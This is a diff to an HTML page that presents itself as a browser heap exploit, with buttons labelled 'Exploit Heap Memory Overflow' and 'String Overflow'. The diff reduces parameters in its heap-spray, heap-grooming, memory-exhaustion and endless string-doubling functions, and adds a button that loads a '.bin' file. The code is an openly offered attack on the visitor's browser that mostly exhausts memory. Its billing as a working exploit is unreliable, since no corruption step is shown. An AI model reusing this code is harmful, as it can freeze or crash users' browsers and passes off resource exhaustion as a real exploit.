@@ -14,8 +14,8 @@
         flex-direction: column;
     }
     button {
-        font-size: 50px;
-        padding: 20px 40px;
+        font-size: 30px; /* Reduced for better compatibility */
+        padding: 15px 30px; /* Reduced for better compatibility */
         border: none;
         background-color: #007BFF;
         color: white;
@@ -41,28 +41,24 @@ const l6 = () => { let m7 = 0; x1(); while (true) { let n8 = { a1: "data" }; let
 function q1() { let r2 = "A".repeat(1000000); while (true) { r2 += r2; if (r2.length > 1000000000) r2 = "A".repeat(1000000); } }
 // Step 1: Initialize Controlled Memory
 function initializeHeap() {
-    //alert("Int heap");
     let buffers = [];
-    for (let i = 0; i < 2048; i++) { // Reduced allocations
-        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
+    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
+        buffers.push(new ArrayBuffer(250000)); // Reduced for better compatibility
     }
     return buffers;
 }
 
 // Step 2: Groom the Heap
 function groomHeap() {
-    //alert("groom heap");
     let tempArray = [];
 
-    // Allocate and deallocate in patterns
-    for (let i = 0; i < 2048; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
+    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
+        let buffer = new ArrayBuffer(500); // Reduced for better compatibility
         tempArray.push(buffer);
     }
 
-    // Deallocate some of the buffers to create holes in the heap
-    for (let i = 0; i < 1512; i++) { // Fewer deallocations
-        tempArray[i] = null; // Free up space to create holes in the heap
+    for (let i = 0; i < 756; i++) { // Reduced for better compatibility
+        tempArray[i] = null;
     }
 
     return tempArray;
@@ -71,45 +67,58 @@ function groomHeap() {
 // Step 3: Memory Exhaustion Function
 function memExh() {
     let bufferArray = [];
-    for (let i = 0; i < 2048; i++) { // Reduced iterations
-        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
-        if (bufferArray.length > 512) { // Less aggressive clearing
-            bufferArray = []; // Clear buffer array to exhaust memory
+    for (let i = 0; i < 1024; i++) { // Reduced for better compatibility
+        bufferArray.push(new ArrayBuffer(450000)); // Reduced for better compatibility
+        if (bufferArray.length > 256) { // Reduced for better compatibility
+            bufferArray = [];
         }
     }
 }
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(900000); // Smaller initial string
+    let largeString = "B".repeat(450000); // Reduced for better compatibility
     let obj = {};
-    let iterationCount = 0; // Counter to track number of iterations
+    let iterationCount = 0;
 
     while (true) {
-        // String concatenation
         largeString += largeString;
-        if (largeString.length > 100000000) { // Lower threshold for reset
-            largeString = "B".repeat(900000); // Reset string to avoid overflow
+        if (largeString.length > 50000000) { // Reduced for better compatibility
+            largeString = "B".repeat(450000); // Reduced for better compatibility
         }
         memExh();
         iterationCount++;
-        if (iterationCount > 64) break; // Control the number of iterations
+        if (iterationCount > 32) break; // Reduced for better compatibility
     }
 }
 
 // Step 5: Perform the Exploit
 function performExploit() {
-    let controlledBuffers = initializeHeap(); // Initialize the heap
-    let groomedHeap = groomHeap(); // Groom the heap
+    let controlledBuffers = initializeHeap();
+    let groomedHeap = groomHeap();
     
-    // Start memory corruption
     memExh();
 
-    // Run the payload
     payload();
 }
 
-//performExploit();
+// Function to install the bin file
+function installBin() {
+    let input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '.bin';
+    input.onchange = e => {
+        let file = e.target.files[0];
+        let reader = new FileReader();
+        reader.onload = function(event) {
+            let binData = event.target.result;
+            console.log("Bin file loaded:", binData);
+            // Add code here to handle the bin file
+        };
+        reader.readAsArrayBuffer(file);
+    };
+    input.click();
+}
 </script>
 </head>
 <body>
@@ -118,10 +127,11 @@ function performExploit() {
     <a href="https://github.com/Debvt/Wm?tab=readme-ov-file" style="text-decoration: underline; color: darkblue;">GitHub</a>
 </div>
 
-<!-- Adding margin to the buttons to prevent overlap with the div -->
+<!-- Added margin to buttons to avoid overlap with the div -->
 <button onclick="l6()" style="margin-bottom: 20px;">Exploit Heap Memory Overflow</button>
 <button onclick="performExploit()" style="margin-bottom: 20px;">Latest Iteration</button>
 <button onclick="y2()" style="margin-bottom: 20px;">String Overflow</button>
+<button onclick="installBin()" style="margin-bottom: 20px;">Install Bin File</button>
 
 <div id="msg"></div>
 </body>
